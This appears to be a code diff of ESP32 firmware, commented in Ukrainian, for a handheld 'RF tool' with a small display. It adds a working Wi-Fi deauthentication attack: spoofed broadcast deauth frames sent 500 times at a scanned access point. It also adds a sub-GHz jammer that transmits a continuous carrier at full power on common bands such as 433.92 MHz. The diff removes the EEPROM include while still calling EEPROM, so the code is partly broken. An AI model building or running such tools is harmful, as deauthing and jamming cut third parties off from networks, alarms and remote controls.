@@ -1,14 +1,17 @@
-#include <Arduino.h>
+/*
+ * RF TOOL v2.0 for ESP32-C3 Supermini
+ * Features: Wi-Fi Deauther, Sub-GHz Scanner & Jammer (SmartRC-CC1101)
+ * Display: ST7735 0.96" (80x160)
+ */
+
 #include <SPI.h>
 #include <Adafruit_GFX.h>
 #include <Adafruit_ST7735.h>
-#include <ELECHOUSE_CC1101.h>
-#include <EEPROM.h>
+#include <SmartRC-CC1101-Driver-Lib.h>
 #include <WiFi.h>
 #include <esp_wifi.h>
 
-// ====================== Піни ESP32-C3 ======================
-// TFT ST7735
+// ====================== Піни для ESP32-C3 Supermini ======================
 #define TFT_CS      5
 #define TFT_DC      6
 #define TFT_RST     7
@@ -16,30 +19,30 @@
 #define TFT_SCLK    8
 #define TFT_BL      9
 
-// CC1101 (SPI)
-#define CC1101_CS   4   // для бібліотеки (не обов'язково, але для сумісності)
-
-// Кнопки
 #define BTN_UP      1
 #define BTN_DOWN    2
 #define BTN_SEL     3
 #define BTN_BACK    0   // BOOT кнопка
 
 Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);
+CC1101 cc1101;
 
-// ====================== Меню ======================
+// ====================== Стани меню ======================
 enum MenuState {
   MAIN_MENU,
   WIFI_MENU,
   SUBGHZ_SCAN,
   SUBGHZ_JAM,
-  SETTINGS,
-  AP_SELECT
+  SETTINGS
 };
 MenuState currentState = MAIN_MENU;
 int menuIndex = 0;
 int subIndex = 0;
 bool isRunning = false;
+
+// Для CC1101
+float freqs[] = {315.0, 433.92, 868.0, 915.0};
+int freqIndex = 1;  // 433.92 за замовчуванням
 
 // Для Wi-Fi
 int apCount = 0;
@@ -47,20 +50,14 @@ int selectedAP = 0;
 String apNames[20];
 uint8_t apBSSID[20][6];
 int apChannels[20];
-bool beaconSpam = false;
-
-// Для CC1101
-float freqs[] = {315.0, 433.92, 868.0, 915.0};
-int freqIndex = 0;
 
 // Налаштування
 int brightness = 150;
-bool saveFlag = false;
+bool settingsChanged = false;
 
 // ====================== Прототипи ======================
 void drawMainMenu();
 void drawWiFiMenu();
-void drawAPSelect();
 void drawSubGHzScan();
 void drawSubGHzJam();
 void drawSettings();
@@ -68,8 +65,6 @@ void updateDisplay();
 void checkButtons();
 void scanWiFi();
 void startDeauth(uint8_t* bssid, int channel);
-void startBeaconSpam();
-void stopWiFiAttack();
 void saveSettings();
 void loadSettings();
 
@@ -93,58 +88,57 @@ void setup() {
   tft.setRotation(1);
   tft.fillScreen(ST77XX_BLACK);
   
-  // EEPROM (збереження)
-  EEPROM.begin(64);
-  loadSettings();
-  
   // CC1101
   SPI.begin(8, 11, 10, 4);  // SCK, MISO, MOSI, CS
-  ELECHOUSE_cc1101.Init();
-  ELECHOUSE_cc1101.setMHZ(freqs[freqIndex]);
-  ELECHOUSE_cc1101.setTxPowerAmp(12);  // макс. потужність
+  cc1101.begin();
+  cc1101.setMHZ(freqs[freqIndex]);
+  cc1101.setTxPower(12);  // максимальна потужність
+  cc1101.setRx();
   
   // Wi-Fi (для деаутера)
   WiFi.mode(WIFI_STA);
   esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
   esp_wifi_set_ps(WIFI_PS_NONE);
   
+  // Завантаження налаштувань
+  loadSettings();
+  
   drawMainMenu();
 }
 
+// ====================== Головний цикл ======================
 void loop() {
   checkButtons();
   
-  // Активні процеси
+  // Сканування Sub-GHz
   if (currentState == SUBGHZ_SCAN && isRunning) {
     static unsigned long lastScan = 0;
     if (millis() - lastScan > 200) {
       lastScan = millis();
-      int rssi = ELECHOUSE_cc1101.getRssi();
-      tft.fillRect(0, 40, 80, 30, ST77XX_BLACK);
-      tft.setCursor(5, 50);
+      int rssi = cc1101.getRssi();
+      tft.fillRect(0, 50, 80, 30, ST77XX_BLACK);
+      tft.setCursor(5, 55);
       tft.print("RSSI: ");
       tft.print(rssi);
       tft.print(" dBm");
     }
   }
   
+  // Джеммінг Sub-GHz
   if (currentState == SUBGHZ_JAM && isRunning) {
-    // Постійна несуча (в бібліотеці немає прямого методу, тому через регістри)
-    static bool carrierOn = false;
-    if (!carrierOn) {
-      ELECHOUSE_cc1101.SetCarrierFreq(freqs[freqIndex]);
-      carrierOn = true;
-    }
-  } else {
-    ELECHOUSE_cc1101.SetIdle();
+    cc1101.setTx(true);
+  } else if (currentState == SUBGHZ_JAM && !isRunning) {
+    cc1101.setTx(false);
+    cc1101.setRx();
   }
   
   delay(20);
 }
 
-// ====================== Меню (малювання) ======================
+// ====================== Малювання меню ======================
 void drawMainMenu() {
   tft.fillScreen(ST77XX_BLACK);
+  tft.setTextSize(1);
   tft.setTextColor(ST77XX_GREEN);
   tft.setCursor(10, 5);
   tft.println("RF TOOL v2.0");
@@ -163,8 +157,8 @@ void drawMainMenu() {
     tft.setCursor(15, y);
     tft.print(items[i]);
   }
-  tft.setCursor(5, 150);
   tft.setTextColor(ST77XX_CYAN);
+  tft.setCursor(5, 150);
   tft.print("UP/DN SEL BACK");
 }
 
@@ -175,8 +169,8 @@ void drawWiFiMenu() {
   tft.print("Wi-Fi Tools");
   tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
   
-  const char* items[] = {"Scan APs", "Deauth Attack", "Beacon Spam"};
-  for (int i = 0; i < 3; i++) {
+  const char* items[] = {"Scan APs", "Start Deauth"};
+  for (int i = 0; i < 2; i++) {
     int y = 30 + i * 20;
     if (i == subIndex) {
       tft.setTextColor(ST77XX_YELLOW);
@@ -187,27 +181,6 @@ void drawWiFiMenu() {
     }
     tft.setCursor(15, y);
     tft.print(items[i]);
-  }
-}
-
-void drawAPSelect() {
-  tft.fillScreen(ST77XX_BLACK);
-  tft.setTextColor(ST77XX_GREEN);
-  tft.setCursor(10, 5);
-  tft.print("Select Target");
-  tft.drawLine(0, 15, 80, 15, ST77XX_WHITE);
-  
-  for (int i = 0; i < min(apCount, 4); i++) {
-    int y = 30 + i * 20;
-    if (i == selectedAP) {
-      tft.setTextColor(ST77XX_YELLOW);
-      tft.setCursor(5, y);
-      tft.print(">");
-    } else {
-      tft.setTextColor(ST77XX_WHITE);
-    }
-    tft.setCursor(15, y);
-    tft.print(apNames[i].substring(0, 10));
   }
 }
 
@@ -266,35 +239,59 @@ void drawSettings() {
   tft.print("Brightness: ");
   tft.print(map(brightness, 0, 255, 0, 100));
   tft.print("%");
-  tft.setCursor(5, 55);
-  tft.print("Save: SEL");
 }
 
-// ====================== Кнопки ======================
+// ====================== Обробка кнопок ======================
 void checkButtons() {
   static unsigned long lastPress = 0;
   if (millis() - lastPress < 200) return;
   
   if (digitalRead(BTN_UP) == LOW) {
     lastPress = millis();
-    if (currentState == MAIN_MENU) menuIndex = (menuIndex + 3) % 4;
-    else if (currentState == WIFI_MENU) subIndex = (subIndex + 2) % 3;
-    else if (currentState == AP_SELECT) selectedAP = (selectedAP + apCount - 1) % apCount;
-    else if (currentState == SUBGHZ_SCAN && !isRunning) freqIndex = (freqIndex + 3) % 4;
-    else if (currentState == SUBGHZ_JAM && !isRunning) freqIndex = (freqIndex + 3) % 4;
-    else if (currentState == SETTINGS) brightness = constrain(brightness - 25, 0, 255);
-    updateDisplay();
+    if (currentState == MAIN_MENU) {
+      menuIndex = (menuIndex + 3) % 4;
+      drawMainMenu();
+    } else if (currentState == WIFI_MENU) {
+      subIndex = (subIndex + 1) % 2;
+      drawWiFiMenu();
+    } else if (currentState == SUBGHZ_SCAN && !isRunning) {
+      freqIndex = (freqIndex + 3) % 4;
+      cc1101.setMHZ(freqs[freqIndex]);
+      drawSubGHzScan();
+    } else if (currentState == SUBGHZ_JAM && !isRunning) {
+      freqIndex = (freqIndex + 3) % 4;
+      cc1101.setMHZ(freqs[freqIndex]);
+      drawSubGHzJam();
+    } else if (currentState == SETTINGS) {
+      brightness = constrain(brightness - 25, 0, 255);
+      analogWrite(TFT_BL, brightness);
+      settingsChanged = true;
+      drawSettings();
+    }
   }
   
   if (digitalRead(BTN_DOWN) == LOW) {
     lastPress = millis();
-    if (currentState == MAIN_MENU) menuIndex = (menuIndex + 1) % 4;
-    else if (currentState == WIFI_MENU) subIndex = (subIndex + 1) % 3;
-    else if (currentState == AP_SELECT) selectedAP = (selectedAP + 1) % apCount;
-    else if (currentState == SUBGHZ_SCAN && !isRunning) freqIndex = (freqIndex + 1) % 4;
-    else if (currentState == SUBGHZ_JAM && !isRunning) freqIndex = (freqIndex + 1) % 4;
-    else if (currentState == SETTINGS) brightness = constrain(brightness + 25, 0, 255);
-    updateDisplay();
+    if (currentState == MAIN_MENU) {
+      menuIndex = (menuIndex + 1) % 4;
+      drawMainMenu();
+    } else if (currentState == WIFI_MENU) {
+      subIndex = (subIndex + 1) % 2;
+      drawWiFiMenu();
+    } else if (currentState == SUBGHZ_SCAN && !isRunning) {
+      freqIndex = (freqIndex + 1) % 4;
+      cc1101.setMHZ(freqs[freqIndex]);
+      drawSubGHzScan();
+    } else if (currentState == SUBGHZ_JAM && !isRunning) {
+      freqIndex = (freqIndex + 1) % 4;
+      cc1101.setMHZ(freqs[freqIndex]);
+      drawSubGHzJam();
+    } else if (currentState == SETTINGS) {
+      brightness = constrain(brightness + 25, 0, 255);
+      analogWrite(TFT_BL, brightness);
+      settingsChanged = true;
+      drawSettings();
+    }
   }
   
   if (digitalRead(BTN_SEL) == LOW) {
@@ -308,42 +305,28 @@ void checkButtons() {
       }
     }
     else if (currentState == WIFI_MENU) {
-      if (subIndex == 0) { // Scan APs
+      if (subIndex == 0) {
         scanWiFi();
-        currentState = AP_SELECT;
-        selectedAP = 0;
-        drawAPSelect();
-      } else if (subIndex == 1) { // Deauth
-        if (apCount > 0) startDeauth(apBSSID[selectedAP], apChannels[selectedAP]);
-      } else if (subIndex == 2) { // Beacon Spam
-        beaconSpam = !beaconSpam;
-        if (beaconSpam) startBeaconSpam();
-        else stopWiFiAttack();
-        drawWiFiMenu();
+        if (apCount > 0) {
+          selectedAP = 0;
+          drawWiFiMenu();
+        }
+      } else if (subIndex == 1) {
+        if (apCount > 0) {
+          startDeauth(apBSSID[selectedAP], apChannels[selectedAP]);
+        }
       }
-    }
-    else if (currentState == AP_SELECT) {
-      currentState = WIFI_MENU;
-      drawWiFiMenu();
     }
     else if (currentState == SUBGHZ_SCAN) {
       isRunning = !isRunning;
       if (isRunning) {
-        ELECHOUSE_cc1101.setMHZ(freqs[freqIndex]);
-        ELECHOUSE_cc1101.RX_Mode();
-      } else {
-        ELECHOUSE_cc1101.SetIdle();
+        cc1101.setRx();
       }
       drawSubGHzScan();
     }
     else if (currentState == SUBGHZ_JAM) {
       isRunning = !isRunning;
       drawSubGHzJam();
-    }
-    else if (currentState == SETTINGS) {
-      analogWrite(TFT_BL, brightness);
-      saveFlag = true;
-      drawSettings();
     }
   }
   
@@ -352,76 +335,79 @@ void checkButtons() {
     if (currentState != MAIN_MENU) {
       currentState = MAIN_MENU;
       isRunning = false;
-      beaconSpam = false;
-      stopWiFiAttack();
-      ELECHOUSE_cc1101.SetIdle();
+      cc1101.setRx();
       drawMainMenu();
-    } else if (saveFlag) {
+    } else if (settingsChanged) {
       saveSettings();
-      saveFlag = false;
+      settingsChanged = false;
     }
-  }
-}
-
-void updateDisplay() {
-  switch (currentState) {
-    case MAIN_MENU: drawMainMenu(); break;
-    case WIFI_MENU: drawWiFiMenu(); break;
-    case AP_SELECT: drawAPSelect(); break;
-    case SUBGHZ_SCAN: drawSubGHzScan(); break;
-    case SUBGHZ_JAM: drawSubGHzJam(); break;
-    case SETTINGS: drawSettings(); break;
   }
 }
 
 // ====================== Wi-Fi функції ======================
 void scanWiFi() {
   apCount = WiFi.scanNetworks();
-  for (int i = 0; i < apCount && i < 20; i++) {
+  if (apCount > 20) apCount = 20;
+  for (int i = 0; i < apCount; i++) {
     apNames[i] = WiFi.SSID(i);
     apChannels[i] = WiFi.channel(i);
     memcpy(apBSSID[i], WiFi.BSSID(i), 6);
   }
   WiFi.scanDelete();
+  
+  tft.fillScreen(ST77XX_BLACK);
+  tft.setTextColor(ST77XX_GREEN);
+  tft.setCursor(10, 5);
+  tft.print("Found APs:");
+  for (int i = 0; i < min(apCount, 4); i++) {
+    tft.setCursor(5, 30 + i * 20);
+    tft.print(apNames[i].substring(0, 12));
+  }
+  delay(1500);
 }
 
 void startDeauth(uint8_t* bssid, int channel) {
   uint8_t deauthPacket[26] = {
-    0xC0, 0x00, 0x00, 0x00, // Frame Control, Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
-    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Source (AP)
-    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID
-    0x00, 0x00, // Sequence
-    0x01, 0x00  // Reason
+    0xC0, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+    0x00, 0x00,
+    0x01, 0x00
   };
   
+  tft.fillScreen(ST77XX_BLACK);
+  tft.setTextColor(ST77XX_RED);
+  tft.setCursor(10, 30);
+  tft.print("DEAUTH");
+  tft.setCursor(10, 50);
+  tft.print("ATTACK");
+  tft.setCursor(10, 70);
+  tft.print("ACTIVE");
+  
   esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-  for (int i = 0; i < 100; i++) {
+  for (int i = 0; i < 500; i++) {
     esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
     delay(10);
   }
-}
-
-void startBeaconSpam() {
-  // Спрощений beacon spam (можна розширити)
-  uint8_t beaconPacket[32] = {0x80, 0x00, 0x00, 0x00};
-  esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
-}
-
-void stopWiFiAttack() {
-  beaconSpam = false;
+  
+  drawWiFiMenu();
 }
 
 // ====================== EEPROM ======================
 void saveSettings() {
+  EEPROM.begin(64);
   EEPROM.write(0, brightness);
   EEPROM.write(1, freqIndex);
   EEPROM.commit();
+  EEPROM.end();
 }
 
 void loadSettings() {
+  EEPROM.begin(64);
   brightness = EEPROM.read(0);
   if (brightness < 10 || brightness > 250) brightness = 150;
   freqIndex = EEPROM.read(1);
   if (freqIndex > 3) freqIndex = 1;
+  EEPROM.end();
 }
